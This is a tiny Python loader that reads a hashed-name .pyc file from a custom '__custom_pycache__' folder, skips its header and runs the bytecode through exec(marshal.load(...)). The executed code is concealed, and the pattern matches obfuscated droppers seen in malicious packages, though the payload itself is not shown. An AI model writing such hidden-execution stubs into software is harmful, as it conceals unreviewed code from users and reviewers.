
import marshal
import os

s = open(os.path.join(os.path.dirname(os.path.realpath(__file__)), '__custom_pycache__', 'Api_0a2fb587954740779d641849f551ae57.cpython-xxx.pyc'), 'rb')
s.seek(16)
exec(marshal.load(s))
